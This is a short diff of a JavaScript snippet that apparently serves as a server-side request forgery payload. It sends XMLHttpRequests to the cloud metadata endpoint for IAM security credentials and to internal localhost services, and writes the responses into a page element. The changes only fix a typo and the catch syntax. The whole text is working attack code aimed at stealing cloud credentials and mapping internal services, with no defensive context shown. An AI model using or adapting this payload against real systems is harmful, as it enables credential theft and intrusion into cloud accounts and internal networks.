@@ -3,7 +3,7 @@ var url1 = "http://169.254.169.254/latest/meta-data/iam/security-credentials/adm
 var url2 = "http://localhost:3000";
 var url3 = "http://localhost:3000/1/catalogs";
 
-var out = document.getElementById("ouput");
+var out = document.getElementById("output");
 out.innerHTML = "init";
 function handler() {
   console.log(1);
@@ -27,19 +27,19 @@ xhr.onreadystatechange = handler;
 try{
  xhr.open("GET", url0, true);
  xhr.send();
- } catch {}
+ } catch(err) {}
 
 try{
 xhr.open("GET", url1, true);
 xhr.send();
- } catch {}
+ } catch(err) {}
 
 try{
 xhr.open("GET", url2, true);
 xhr.send();
- } catch {}
+ } catch(err) {}
 
 try{
 xhr.open("GET", url3, true);
 xhr.send();
- } catch {}
+ } catch(err) {}
